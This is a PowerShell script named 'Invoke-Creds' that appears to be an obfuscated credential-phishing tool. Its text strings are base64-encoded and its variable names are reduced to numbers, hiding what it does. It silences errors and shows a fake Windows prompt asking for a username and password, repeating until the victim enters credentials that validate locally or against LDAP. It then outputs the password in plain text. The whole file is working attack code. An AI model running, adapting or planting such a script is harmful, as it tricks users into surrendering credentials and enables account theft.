
function Invoke-Creds
{
[CmdletBinding()]
Param ()
    $ErrorActionPreference=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQA=')))
    Add-Type -assemblyname system.DirectoryServices.accountmanagement 
    ${8} = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
    ${7} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA6AC8ALwA='))) + ([ADSI]"").distinguishedName
    while($true)
    {
        ${10} = $host.ui.PromptForCredential($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbABzACAAYQByAGUAIAByAGUAcQB1AGkAcgBlAGQAIAB0AG8AIABwAGUAcgBmAG8AcgBtACAAdABoAGkAcwAgAG8AcABlAHIAYQB0AGkAbwBuAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABsAGUAYQBzAGUAIABlAG4AdABlAHIAIAB5AG8AdQByACAAdQBzAGUAcgAgAG4AYQBtAGUAIABhAG4AZAAgAHAAYQBzAHMAdwBvAHIAZAAuAA=='))), "", "")
        if(${10})
        {
            ${9} = ${10}.GetNetworkCredential()
            [String]${5} = ${9}.username
            [String]${4} = ${9}.password
            [String]${3} = ${9}.domain
            ${6} = ${8}.ValidateCredentials(${5}, ${4})
            ${2} = New-Object System.DirectoryServices.DirectoryEntry(${7},${5},${4})
            if((${6} -eq $true) -or (${2}.name -ne $null))
            {
                ${1} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBuAGEAbQBlADoAIAA='))) + ${5} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABQAGEAcwBzAHcAbwByAGQAOgAgAA=='))) + ${4} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABEAG8AbQBhAGkAbgA6AA=='))) + ${3} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABEAG8AbQBhAGkAbgA6AA==')))+ ${2}.name
                ${1}
                break
            }
        }
    }
}
